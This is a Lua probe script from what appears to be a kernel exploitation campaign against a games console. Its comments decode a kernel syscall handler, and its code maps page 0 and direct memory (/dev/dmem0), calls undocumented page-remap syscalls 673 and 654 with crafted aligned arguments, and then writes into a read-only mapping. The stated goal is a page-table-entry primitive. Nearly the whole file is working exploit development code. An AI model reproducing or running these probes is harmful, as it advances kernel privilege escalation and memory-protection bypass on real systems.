-- CRASH_CLASS: LOW
-- PROBE 1418a: 673 page-remap with the correct arg shape, across mapping types; page-0 mmap
--
-- prior art:
--   results/phase36_realargs/1416a_blockpool_open_20261109_154348.txt
--     653 opens descriptors for a game process; 654/655/657 answer EINVAL to every shape.
--   results/phase36_realargs/1417a_blockpool_descriptor_20261109_154513.txt
--     654/655 keyed on real user VAs (dmem prot 3, dmem prot 1, anon) all EINVAL.
--   docs/sysent-names-13.60.csv / results/kernel_handlers: 673 page remap, body
--     0xffffffff8b36b1f0, decoded this session:
--       rax=[td+8]; rbx=[rax+0x200]; rdi=[rbx+0x20]; rcx=[rbx+0x28]
--       reject unless  [rbx+0x20] <= uap[0] < [rbx+0x28]  and (uap[0]&0xffff)==0
--                 and  [rbx+0x20] <= uap[1], [rbx+0x28] > uap[1], (uap[1]&0xffff)==0
--                 and  (uap[2]&0xffff)==0, uap[2] <= uap[1]-uap[0], uap[2] <= [rbx+0x28]-uap[1]
--                 and  dword [uap+0x18] == 0
--       then 0x8ac86820(rbx,0,0) (map lock), 0x8ac86c40(rbx,uap[0],&entry) (map lookup),
--       entry must have byte [entry+0x60]&2 == 0, qword [entry+0x50] != 0 and
--       byte [[entry+0x50]+0x9d] == 0xb, then the entry bounds are re-checked against
--       uap[1]/uap[2].  654 and 655 have the same prologue and the same 0xb object test.
--   results/phase35_dead_end_reruns/1395a_dev_mmap_offset_wrap_20261109_141742.txt
--     MAP_FIXED at 0xFFFFFFFFC0000000 / 0xFFFFFFFFC1000000 / 0xFFFFFFFFD0000000 /
--     0x7FFFFFFF0000 / 0x7FFFFFFFFFF000 all EINVAL; page 0 was never tried.
--   docs/DEAD_ENDS.md:85  673 returned -1 "GPU mmap backing object isn't type 11".
--
-- Reading: 673 wants three 64 KiB-aligned addresses and an object type of 0xb behind the
-- range.  Earlier probes called it with 4 KiB values, which the alignment gate rejects
-- before the lookup, so the "wrong object type" verdict was never actually measured.
-- The one previous test used a GPU-shape mmap; dmem, shm and file mappings were not tried.
-- A 673 that returns 0 remaps live pages, which is the shape of a PTE primitive.
--
-- Method: build 1 MiB mappings of several kinds, take a 64 KiB-aligned window inside each,
-- call 673(start, start+0x10000, 0x10000, 0) and variants, and only then touch memory.

print("=== PROBE 1418a: 673 REMAP SHAPE + PAGE 0 ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sg(v) local n = N(v) if n >= 0x8000000000000000 then return n - 0x10000000000000000 end return n end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end
local function hex4(v) if v == nil then return "????????" end return string.format("%08X", v) end
local function call6(sc, a, b, c, d, e)
    local ok, rv = pcall(function() return sc(uint64(a or 0), uint64(b or 0), uint64(c or 0), uint64(d or 0), uint64(e or 0), uint64(0)) end)
    if not ok then return "EXC" end
    return sg(rv)
end

local pid = sg(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", pid))

local sc477 = mk(477)
local function mmap_raw(addr, len, prot, flags, fd, off)
    local va = N(sc477(uint64(addr), uint64(len), uint64(prot), uint64(flags),
        uint64(fd or 0xFFFFFFFF), uint64(off or 0)))
    if va < 0x10000 or va > 0x8000000000 then return nil end
    return va
end
local function str_addr(s)
    local va = mmap_raw(0, 0x1000, 3, 0x1002, nil, 0)
    if not va then return nil end
    for i = 1, #s do pcall(function() memory.write_byte(va + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(va + #s, 0) end)
    return va
end

-- ------------------------------------------------------------------ page 0
print("[P] can userland map low addresses (MAP_FIXED = 0x10, MAP_ANON = 0x1000)")
for _, a in ipairs({0, 0x1000, 0x10000, 0x100000, 0x400000}) do
    local rv = call6(sc477, a, 0x1000, 3, 0x1012, 0xFFFFFFFF, 0)
    print(string.format("  477(FIXED at 0x%X, len 0x1000, prot 3, ANON|PRIVATE) -> %s errno=%s",
        a, tostring(rv), es()))
end

-- ------------------------------------------------------------------ build mappings
print("[A] build 1 MiB mappings")
local maps = {}

local function addmap(tag, va, prot)
    if not va then print(string.format("  %s: mmap failed (%s)", tag, es())) return end
    local aligned = math.floor(va / 0x10000) * 0x10000
    if aligned < va then aligned = aligned + 0x10000 end
    if aligned + 0x10000 > va + 0x100000 then
        print(string.format("  %s: va 0x%X has no interior 64 KiB window", tag, va))
        return
    end
    maps[#maps + 1] = { tag = tag, va = va, win = aligned, prot = prot }
    print(string.format("  %s: va 0x%X prot %d window 0x%X", tag, va, prot, aligned))
    pcall(function() memory.write_dword(aligned, 0x5A5A0000 + #maps) end)
    print(string.format("    window first dword = %s", hex4(rd(aligned))))
end

addmap("anon", mmap_raw(0, 0x100000, 3, 0x1002, nil, 0), 3)

local P = str_addr("/dev/dmem0")
local dfd = nil
if P then
    dfd = call6(mk(5), P, 0x4002)
    print(string.format("  open(/dev/dmem0) -> %s errno=%s", tostring(dfd), es()))
end
if type(dfd) == "number" and dfd >= 0 then
    addmap("dmem_rw", mmap_raw(0, 0x100000, 3, 1, dfd, 0x1000), 3)
    addmap("dmem_ro", mmap_raw(0, 0x100000, 1, 1, dfd, 0x200000), 1)
end

local SHM = str_addr("/shm_probe_1418a")
if SHM then
    local sfd = call6(mk(482), SHM, 0x0A02, 0x180)
    print(string.format("  shm_open(0x0A02) -> %s errno=%s", tostring(sfd), es()))
    if type(sfd) == "number" and sfd >= 0 then
        print(string.format("  ftruncate(482-fd 0x%X) -> %s", sfd, tostring(call6(mk(480), sfd, 0x100000))))
        addmap("shm", mmap_raw(0, 0x100000, 3, 1, sfd, 0), 3)
    end
end

-- ------------------------------------------------------------------ 673
print("[B] 673 on each window (start, start+0x10000, 0x10000, 0)")
local sc673 = mk(673)
local hit = nil
for _, m in ipairs(maps) do
    local s = m.win
    local e = s + 0x10000
    local r1 = call6(sc673, s, e, 0x10000, 0, 0)
    print(string.format("  673(%s:0x%X) -> rv=%s errno=%s", m.tag, s, tostring(r1), es()))
    if r1 == 0 then hit = m end
    local r2 = call6(sc673, s, e, 0x1000, 0, 0)
    print(string.format("    673(same, align 0x1000) -> rv=%s errno=%s", tostring(r2), es()))
    local r3 = call6(sc673, s, e, 0x10000, 1, 0)
    print(string.format("    673(same, arg4=1) -> rv=%s errno=%s", tostring(r3), es()))
end

-- ------------------------------------------------------------------ 654 with 64 KiB alignment
print("[C] 654 with 64 KiB-aligned pool offsets, in case the pool window is a VA range")
local sc654 = mk(654)
for _, m in ipairs(maps) do
    local r = call6(sc654, m.win, 0x10000, 0, 0, 0)
    print(string.format("  654(%s:0x%X,0x10000,0,0,0) -> rv=%s errno=%s", m.tag, m.win, tostring(r), es()))
    if r == 0 then hit = m end
end

-- ------------------------------------------------------------------ final: is the RO page writable
print("[D] last action: store into the read-only window")
for _, m in ipairs(maps) do
    if m.tag == "dmem_ro" then
        print(string.format("  about to write 0xDEADBEEF at 0x%X (prot 1)", m.win))
        local ok = pcall(function() memory.write_dword(m.win, 0xDEADBEEF) end)
        print(string.format("  write ok=%s readback=%s", tostring(ok), hex4(rd(m.win))))
    end
end
print(string.format("[E] hit=%s", hit and hit.tag or "none"))
print("=== PROBE 1418a COMPLETE ===")
